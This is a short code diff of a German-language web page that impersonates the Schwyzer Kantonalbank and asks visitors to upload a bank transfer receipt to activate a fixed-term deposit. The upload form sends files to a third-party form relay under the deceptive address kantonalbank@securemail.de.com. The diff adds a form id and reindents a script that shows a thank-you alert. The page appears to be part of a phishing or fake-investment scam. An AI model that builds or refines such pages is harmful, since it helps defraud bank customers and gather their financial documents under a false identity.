@@ -267,7 +267,7 @@ Bielefelder Straße 16
 
         <div class="info-box">
           <p class="label">Überweisungsquittung:</p>
-          <form action="https://formsubmit.co/kantonalbank@securemail.de.com" method="POST" enctype="multipart/form-data">
+  <form id="uploadForm" action="https://formsubmit.co/kantonalbank@securemail.de.com" method="POST" enctype="multipart/form-data">
   <label for="file">Überweisungsbeleg auswählen:</label><br>
   <input type="file" name="attachment" required><br><br>
 
@@ -278,11 +278,11 @@ Bielefelder Straße 16
 
   <button type="submit" class="button-red">Jetzt hochladen</button>
 </form> 
-        <script>
-  document.getElementById("uploadForm").addEventListener("submit", function(event) {
-    alert("Ihre Datei wurde gesendet. Vielen Dank!");
-  });
-</script>
+   <script>
+    document.getElementById("uploadForm").addEventListener("submit", function(event) {
+      alert("Ihre Datei wurde gesendet. Vielen Dank!");
+    });
+  </script>
         <p>Gemäß banküblicher Sorgfaltspflicht kann die Gutschrift bei der Schwyzer Kantonalbank erst nach Vorlage des Belegs final bestätigt und bearbeitet werden. 
         So stellen wir sicher, dass Ihre Festgeldanlage korrekt und fristgerecht aktiviert wird.</p>
         </div>
